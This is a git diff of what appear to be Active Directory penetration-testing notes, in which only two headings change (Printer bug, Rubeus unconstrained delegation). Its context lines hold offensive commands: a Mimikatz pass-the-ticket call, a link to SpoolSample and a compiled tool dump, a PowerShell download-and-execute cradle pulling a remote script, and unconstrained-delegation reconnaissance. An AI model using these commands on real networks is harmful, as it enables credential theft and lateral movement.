@@ -781,7 +781,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2c
 ```
 
 
-# Printer bug - why wait when you can spool?
+# Printer bug - why wait when you can spool
 https://github.com/leechristensen/SpoolSample
 
 compiled binary available here - [Tool dump](https://github.com/conma293/mvp) 
@@ -796,7 +796,7 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 
 * * *
 
-#### Rubeus
+#### Rubeus Unconstrained Delegation Attack Flow
 ```Get-NetComputer -UnConstrained```
 
 ```
